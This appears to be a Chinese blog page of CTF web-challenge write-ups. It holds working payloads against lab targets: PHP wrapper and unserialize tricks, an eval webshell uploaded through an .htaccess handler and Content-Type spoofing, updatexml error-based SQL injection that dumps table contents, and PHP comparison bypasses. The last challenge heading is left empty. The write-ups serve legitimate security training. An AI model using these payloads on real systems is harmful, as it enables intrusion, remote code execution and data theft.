<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>每天一道ctf - IT学习者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="每天一道ctf" />
<meta property="og:description" content="一.[ZJCTF 2019]NiZhuanSiWei 看到注释有 useless.php于是访问一下
发现什么都没有
代码审计：有这样一行代码isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&#34;welcome to the zjctf&#34;，我们需要传入一个内容为welcome to the zjctf的文件。这时就要用到data协议
data协议通常是用来执行PHP代码，也可以将内容写入data协议中，然后让file_get_contents函数取读取。构造：data://text/plain,welcome to the zjctf，为了绕过某些过滤，这里用到base64编码。构造payload：text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=。
然后有一个可控参数file，构造file=useless.php，但是针对php文件我们需要进行base64编码，否则读取不到其内容，所以构造payload：file=php://filter/read=convert.base64-encode/resource=useless.php。
得到以下经过base64加密的字符，
然后base64解密，得到 useless.php的内容
&lt;?php ​ class Flag{ //flag.php public $file; public function __tostring(){ if(isset($this-&gt;file)){ echo file_get_contents($this-&gt;file); echo &#34;&lt;br&gt;&#34;; return (&#34;U R SO CLOSE !///COME ON PLZ&#34;); } } } ?&gt; 需要调用flag，序列化处理
&lt;?php class Flag{ public $file=&#39;flag.php&#39;; public function __tostring(){ if(isset($this-&gt;file)){ echo file_get_contents($this-&gt;file); echo &#34;&lt;br&gt;&#34;; return (&#34;U R SO CLOSE !///COME ON PLZ&#34;); } } } $password=new Flag(); $password = serialize($password); echo $password; ?" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://itnewbiea.github.io/posts/c219b361034ce189b2d85a6f0477f5c5/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-11-13T21:19:21+08:00" />
<meta property="article:modified_time" content="2022-11-13T21:19:21+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="IT学习者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">IT学习者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">每天一道ctf</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <h3>一.[ZJCTF 2019]NiZhuanSiWei</h3> 
<p><img alt="" height="522" src="https://images2.imgbox.com/f5/9e/VhSniY6j_o.png" width="865"></p> 
<p>看到注释有 <code>useless.php于是访问一下</code></p> 
<p><img alt="" height="195" src="https://images2.imgbox.com/7c/d3/xJKKrW1D_o.png" width="687"></p> 
<p>发现什么都没有</p> 
<p><strong>代码审计</strong>：有这样一行代码isset($text)&amp;&amp;(file_get_contents($text,'r')==="welcome to the zjctf"，我们需要传入一个内容为welcome to the zjctf的文件。这时就要用到data协议</p> 
<p>data协议通常是用来执行PHP代码，也可以将内容写入data协议中，然后让file_get_contents函数取读取。构造：data://text/plain,welcome to the zjctf，为了绕过某些过滤，这里用到base64编码。构造payload：text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=。</p> 
<p>然后有一个可控参数file，构造file=useless.php，但是针对php文件我们需要进行base64编码，否则读取不到其内容，所以构造payload：file=php://filter/read=convert.base64-encode/resource=useless.php。<br> 得到以下经过base64加密的字符，<br><img alt="" height="203" src="https://images2.imgbox.com/a8/3f/wZwjH18q_o.png" width="1200"></p> 
<p>然后base64解密，得到 useless.php的内容</p> 
<pre><code class="hljs">&lt;?php  
​
class Flag{  //flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this-&gt;file)){  
            echo file_get_contents($this-&gt;file); 
            echo "&lt;br&gt;";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
?&gt;
</code></pre> 
<p>需要调用flag，序列化处理</p> 
<pre><code class="hljs">&lt;?php  
class Flag{
    public $file='flag.php';  
    public function __tostring(){  
        if(isset($this-&gt;file)){  
            echo file_get_contents($this-&gt;file); 
            echo "&lt;br&gt;";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
} 
$password=new Flag();
$password = serialize($password);
echo $password; 
?&gt;  

</code></pre> 
<p>结果为：O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}</p> 
<p>最终payload：</p> 
<pre><code class="hljs">?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}</code></pre> 
<p><img alt="" height="348" src="https://images2.imgbox.com/e2/d3/Ha1rAHtR_o.png" width="542"></p> 
<p>查看源码</p> 
<p> <img alt="" height="394" src="https://images2.imgbox.com/dd/b1/ruhBY0Ec_o.png" width="719"></p> 
<h3> 二.[MRCTF2020]你传你🐎呢</h3> 
<p>先试着个一句话木马上去<code>&lt;?php @eval($_POST['test']);?&gt;</code></p> 
<p><img alt="" height="149" src="https://images2.imgbox.com/57/f3/BqtDXbY2_o.png" width="404"></p> 
<p>上传失败，<br> 接着又试了试图片马，</p> 
<p><img alt="" height="131" src="https://images2.imgbox.com/fe/e9/7oG7gg6w_o.png" width="312"> </p> 
<p>失败了</p> 
<p>然后 上传.htaccess文件，用来改变文件扩展名</p> 
<pre><code class="hljs">&lt;FilesMatch "a.png"&gt;
SetHandler application/x-httpd-php
&lt;/FilesMatch&gt;</code></pre> 
<p>&lt;FilesMatch "a.png"&gt;指定的是要上传的文件，注意文件名必须相同</p> 
<p>上传时先抓包，修改Content-Type:image/png</p> 
<p><img alt="" height="244" src="https://images2.imgbox.com/47/ec/CUGY3xRC_o.png" width="491"><br> 点击forward，上传成功</p> 
<p>第二个：木马文件，用来连接蚁剑或菜刀</p> 
<p>上传时同样修改Content-Type:image/png</p> 
<p><img alt="" height="80" src="https://images2.imgbox.com/5d/24/HnkrRhSM_o.png" width="728"><br> 用蚁剑连接：http://93ac29f7-de06-4936-9f07-9b157b4704d2.node4.buuoj.cn:81/upload/fa59a7192463c0cd3dae65088e762e1f/a.png</p> 
<p> <img alt="" height="164" src="https://images2.imgbox.com/2d/fd/D0lYVAqX_o.png" width="476"></p> 
<p>得到flag</p> 
<p><img alt="" height="128" src="https://images2.imgbox.com/a1/0d/CASEY6j9_o.png" width="654"> </p> 
<h3>三. [极客大挑战 2019]HardSQL</h3> 
<p>sql注入的题目</p> 
<p>先试万能密码，很明显被ban了     是报错注入</p> 
<p>查数据库的信息，得到geek</p> 
<pre><code class="hljs">/check.php?username=admin'or(updatexml(1,concat(0x7e,database(),0x7e),1))%23&amp;password=123</code></pre> 
<p><img alt="" height="462" src="https://images2.imgbox.com/bf/da/MdXwcu2e_o.png" width="496"></p> 
<p> 查表，得到H4rDsq1</p> 
<pre><code class="hljs">/check.php?username=admin'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))%23&amp;password=123
</code></pre> 
<p><img alt="" height="397" src="https://images2.imgbox.com/3e/61/9RsJ5F6F_o.png" width="675"></p> 
<p>查字段，得到id,username,password</p> 
<pre><code class="hljs">/check.php?username=admin'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e),1))%23&amp;password=123</code></pre> 
<p><img alt="" height="301" src="https://images2.imgbox.com/6b/31/yapJl4T8_o.png" width="616"></p> 
<p>查数据，首先得到了一半的flag</p> 
<pre><code class="hljs">/check.php?username=admin'or(updatexml(1,concat(0x7e,(select(group_concat(username,'~',password))from(H4rDsq1)),0x7e),1))%23&amp;password=123</code></pre> 
<p><img alt="" height="269" src="https://images2.imgbox.com/95/21/G7syChk3_o.png" width="689"></p> 
<p> flag{2ec69aaf-c092-47f5-9e</p> 
<p>再用left()right()语句进行查询拼接</p> 
<pre><code class="hljs">/check.php?username=admin'or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))%23&amp;password=123</code></pre> 
<p><img alt="" height="257" src="https://images2.imgbox.com/69/85/FaFkJlOZ_o.png" width="652"></p> 
<p>2-47f5-9e5e-cf80d3d28e85}</p> 
<p>得到flag</p> 
<p>flag{2ec69aaf-c092-47f5-9e5e-cf80d3d28e85}</p> 
<h3>四.[MRCTF2020]Ez_bypass</h3> 
<p><img alt="" height="246" src="https://images2.imgbox.com/d8/97/CtcQ4v0X_o.png" width="873"></p> 
<p> F12查看源码</p> 
<pre><code class="hljs">I put something in F12 for you
include 'flag.php';
$flag='MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}';
if(isset($_GET['gg'])&amp;&amp;isset($_GET['id'])) {
    $id=$_GET['id'];
    $gg=$_GET['gg'];
    if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) {
        echo 'You got the first step';
        if(isset($_POST['passwd'])) {
            $passwd=$_POST['passwd'];
            if (!is_numeric($passwd))
            {
                 if($passwd==1234567)
                 {
                     echo 'Good Job!';
                     highlight_file('flag.php');
                     die('By Retr_0');
                 }
                 else
                 {
                     echo "can you think twice??";
                 }
            }
            else{
                echo 'You can not get it !';
            }

        }
        else{
            die('only one way to get the flag');
        }
}
    else {
        echo "You are not a real hacker!";
    }
}
else{
    die('Please input first');
}
}Please input first

</code></pre> 
<p>这里要求<code>md5($id) === md5($gg) &amp;&amp; $id !== $gg</code></p> 
<blockquote> 
 <p><code>md5($v1)===md5($v2)</code>数组绕过：a[]=a&amp;b[]=b<br> 最后可能会报错，但是<code>null=null</code>，判断为true，成功绕过</p> 
</blockquote> 
<p>使用数组绕过：<code>/?id[]=a&amp;gg[]=b</code></p> 
<p><img alt="" height="434" src="https://images2.imgbox.com/37/56/hhDOaY6l_o.png" width="964"></p> 
<p> 接着要以POST传参</p> 
<pre><code class="hljs">if (!is_numeric($passwd))
            {
                 if($passwd==1234567)
                 {
                     echo 'Good Job!';
                     highlight_file('flag.php');
                     die('By Retr_0');
                 }
</code></pre> 
<p>其中<code>is_numeric() </code>函数用于检测变量是否为数字或数字字符串。这里要求passwd不是数字或数字字符串时，弱等于判断passwd是否等于1234567<br> 故构造payload：<code>passwd=1234567a</code></p> 
<p><img alt="" height="566" src="https://images2.imgbox.com/55/91/NAoB8IT0_o.png" width="945"></p> 
<p> 得到flag</p> 
<h3>五.[SUCTF 2019]CheckIn</h3> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p> </p>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/ff8b77e55b61d47b40169f701fac9a67/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">replace的使用</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/03a4741aff485bc4140376fd5c28551c/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">sharding-jdbc实现读写分离</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 IT学习者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://itnewbiea.github.io/js/foot.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>